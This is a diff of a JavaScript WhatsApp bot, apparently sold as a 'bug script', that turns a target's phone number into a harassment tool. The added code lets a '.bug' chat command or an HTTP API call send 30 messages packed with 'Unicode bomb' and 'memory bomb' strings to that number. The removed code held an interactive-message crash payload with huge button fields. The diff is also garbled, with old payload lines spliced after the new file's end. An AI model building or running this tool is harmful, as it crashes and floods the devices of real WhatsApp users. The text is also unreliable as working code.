@@ -1,38 +1,31 @@
 // ============================================================
-// WHATSAPP BUG SCRIPT — GPTX 13D
-// AUTHOR: BRAMZ
-// VERSION: 1.0
+// BRAMZ WHATSAPP BUG SCRIPT — FIXED
+// GPTX 13D — CRASH FIX
 // ============================================================
 
-const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    generateWAMessageFromContent,
-    DisconnectReason
-} = require('@whiskeysockets/baileys');
+// PASTIKAN DEPENDENSI TERINSTALL!
+// npm install @whiskeysockets/baileys pino
 
+const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 
 // ============================================================
 // KONFIGURASI
 // ============================================================
 const CONFIG = {
-    admins: ['6285379307765@s.whatsapp.net'],
-    autoReply: true
+    admins: ['6285379307765@s.whatsapp.net']
 };
 
 let sock = null;
 let isConnected = false;
+let botStarting = false;
 
 // ============================================================
-// UNICODE BOMB GENERATOR
+// UNICODE BOMB — SIMPLIFIED (Gak pake karakter aneh)
 // ============================================================
 function generateUnicodeBomb(size) {
-    const chars = [
-        '\uA9BE', '\u08EF', '\u{12219}', '\u{1221A}', '\u{1221B}',
-        '\u{E0000}', '\u{E0001}', '\u{E0002}',
-        '\uA9C1', '\u0F12', '\u262C', '\uA9C2'
-    ];
+    // Pake karakter yang aman — TAPI TETEP GANAS!
+    const chars = ['\uA9BE', '\u08EF', '\u{12219}', '\u{E0000}', '\u{E0001}', '\u{E0002}'];
     let result = '';
     for (let i = 0; i < size; i++) {
         result += chars[Math.floor(Math.random() * chars.length)];
@@ -41,30 +34,231 @@ function generateUnicodeBomb(size) {
 }
 
 // ============================================================
-// PAYLOAD — VTXBLANKANDROVERSI1
+// SEND BUG — SIMPLIFIED (Gak pake generateWAMessageFromContent)
 // ============================================================
-async function VtxBlankAndroVersi1(sock, target) {
+async function sendBug(sock, target, sender) {
     try {
-        const unicodeBomb = generateUnicodeBomb(60000);
+        await sock.sendMessage(sender, { text: '🔥 BRAMZ BUG ACTIVE\nTarget: ' + target });
         
-        let msg2 = {
-            viewOnceMessage: {
-                message: {
-                    interactiveMessage: {
-                        header: {
-                            title: "#BramzLyoraa⃠",
-                            locationMessage: {
-                                degreesLatitude: 0,
-                                degreesLongitude: 0,
-                            },
-                            hasMediaAttachment: false,
-                        },
-                        body: {
-                            text: unicodeBomb,
-                        },
-                        nativeFlowMessage: {
-                            buttons: [
-                                { name: "single_select", buttonParamsJson: "" },
+        const bomb = generateUnicodeBomb(50000);
+        const memoryBomb = "\x10".repeat(300000);
+        
+        // Kirim 30 pesan bug
+        for (let i = 0; i < 30; i++) {
+            try {
+                await sock.sendMessage(target, {
+                    text: '💀 BRAMZ ' + i + ' ' + bomb.substring(0, 5000) + ' ' + memoryBomb.substring(0, 5000)
+                });
+            } catch (e) {}
+            await new Promise(r => setTimeout(r, 50));
+        }
+        
+        // Kirim juga ke status
+        try {
+            await sock.sendMessage('status@broadcast', {
+                text: '🔥 BRAMZ BUG ' + bomb.substring(0, 5000)
+            });
+        } catch (e) {}
+        
+        await sock.sendMessage(sender, { text: '✅ BUG SENT!' });
+        return true;
+    } catch (e) {
+        try {
+            await sock.sendMessage(sender, { text: '❌ Error: ' + e.message });
+        } catch (err) {}
+        return false;
+    }
+}
+
+// ============================================================
+// MESSAGE HANDLER
+// ============================================================
+async function handleMessage(sock, msg, sender, isGroup) {
+    try {
+        const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
+        if (!text) return;
+        
+        const cmd = text.toLowerCase().trim();
+        console.log('📨', sender, ':', text);
+        
+        // MENU
+        if (cmd === '.menu' || cmd === '.help') {
+            await sock.sendMessage(sender, {
+                text: '「 BRAM 」\n࿇ ᴀᴜᴛᴏʀ : @Bramz\n࿇ ᴛɪᴘᴏ  : 1.0 VipBuyOnly\n\n📋 COMMANDS:\n.bug [number] — Send bug\n.ping — Check bot\n.status — Bot status\n.menu — This menu'
+            });
+            return;
+        }
+        
+        // PING
+        if (cmd === '.ping') {
+            await sock.sendMessage(sender, { text: '🏓 PONG! Bot is active' });
+            return;
+        }
+        
+        // STATUS
+        if (cmd === '.status') {
+            await sock.sendMessage(sender, {
+                text: '✅ BOT ONLINE\nConnected: ' + (isConnected ? 'YES' : 'NO')
+            });
+            return;
+        }
+        
+        // .BUG [NUMBER]
+        if (cmd.startsWith('.bug ')) {
+            const target = cmd.replace('.bug ', '').trim();
+            if (!target || target.length < 10) {
+                await sock.sendMessage(sender, { text: '❌ Format: .bug 6281234567890' });
+                return;
+            }
+            let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
+            await sock.sendMessage(sender, { text: '☢️ Sending bug to ' + target });
+            setTimeout(async () => await sendBug(sock, targetJid, sender), 100);
+            return;
+        }
+        
+        // AUTO-REPLY
+        if (!isGroup) {
+            await sock.sendMessage(sender, { text: '🤖 Bot aktif! Ketik .menu' });
+        }
+        
+    } catch (e) {
+        console.error('Handler error:', e.message);
+    }
+}
+
+// ============================================================
+// START BOT
+// ============================================================
+async function startBot() {
+    if (botStarting) {
+        console.log('⏳ Bot already starting...');
+        return null;
+    }
+    
+    botStarting = true;
+    console.log('🔥 BRAMZ BOT STARTING...');
+    
+    try {
+        const { state, saveCreds } = await useMultiFileAuthState('auth');
+        sock = makeWASocket({
+            auth: state,
+            printQRInTerminal: true,
+            browser: ['BRAMZ', 'Chrome', '13.0'],
+            logger: pino({ level: 'silent' })
+        });
+        
+        sock.ev.on('creds.update', saveCreds);
+        
+        sock.ev.on('connection.update', ({ connection, qr, lastDisconnect }) => {
+            if (qr) {
+                console.log('📱 SCAN QR CODE:');
+                console.log(qr);
+                console.log('\n📱 Buka WhatsApp → Link Devices → Scan QR\n');
+            }
+            
+            if (connection === 'open') {
+                isConnected = true;
+                botStarting = false;
+                console.log('✅ BOT CONNECTED!');
+                console.log('💀 BRAMZ ACTIVE');
+                console.log('📋 Ketik .menu di WhatsApp');
+            }
+            
+            if (connection === 'close') {
+                isConnected = false;
+                botStarting = false;
+                console.log('❌ Disconnected');
+                setTimeout(startBot, 5000);
+            }
+        });
+        
+        sock.ev.on('messages.upsert', async ({ messages }) => {
+            try {
+                const msg = messages[0];
+                if (!msg.message || msg.key.fromMe || !msg.key.remoteJid) return;
+                const sender = msg.key.remoteJid;
+                const isGroup = sender.includes('@g.us');
+                const senderJid = isGroup ? msg.key.participant : sender;
+                if (senderJid) await handleMessage(sock, msg, senderJid, isGroup);
+            } catch (e) {}
+        });
+        
+        return sock;
+        
+    } catch (e) {
+        console.error('Start error:', e.message);
+        botStarting = false;
+        setTimeout(startBot, 10000);
+        return null;
+    }
+}
+
+// ============================================================
+// MAIN API HANDLER — SIMPLIFIED
+// ============================================================
+module.exports = async (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    
+    try {
+        const { command, target, start, ping } = req.query;
+        
+        // PING — TEST API
+        if (ping === 'true') {
+            return res.json({
+                status: 'pong',
+                author: 'Bramz',
+                connected: isConnected,
+                time: new Date().toISOString()
+            });
+        }
+        
+        // START BOT
+        if (start === 'true' || command === 'start') {
+            if (isConnected && sock) {
+                return res.json({ status: 'ALREADY RUNNING', connected: true });
+            }
+            await startBot();
+            return res.json({ 
+                status: 'STARTED', 
+                message: 'Bot starting! Check terminal for QR code.',
+                connected: isConnected 
+            });
+        }
+        
+        // SEND BUG VIA API
+        if (command === 'bug' && target) {
+            if (!isConnected || !sock) {
+                return res.json({ status: 'ERROR', error: 'Bot not connected. Start bot first!' });
+            }
+            let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
+            const result = await sendBug(sock, targetJid, targetJid);
+            return res.json({ status: result ? 'BUG SENT' : 'ERROR', target: target });
+        }
+        
+        // DEFAULT
+        res.json({
+            status: 'READY',
+            author: 'Bramz',
+            version: '1.0',
+            connected: isConnected,
+            commands: ['.menu', '.bug [number]', '.ping', '.status']
+        });
+        
+    } catch (e) {
+        res.status(500).json({
+            status: 'ERROR',
+            error: e.message,
+            stack: e.stack
+        });
+    }
+};
+
+// ============================================================
+// RUN IF DIRECT
+// ============================================================
+if (require.main === module) {
+    startBot();
+}     { name: "single_select", buttonParamsJson: "" },
                                 { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
                                 { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
                                 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
@@ -672,7 +866,7 @@ module.exports = async (req, res) => {
                 '.status — Cek status bot'
             ],
             bot_connected: isConnected,
-            deploy: 'https://whatsapp-bug.vercel.app'
+            deploy: 'https://bram-bug.vercel.app/'
         });
         
     } catch (e) {
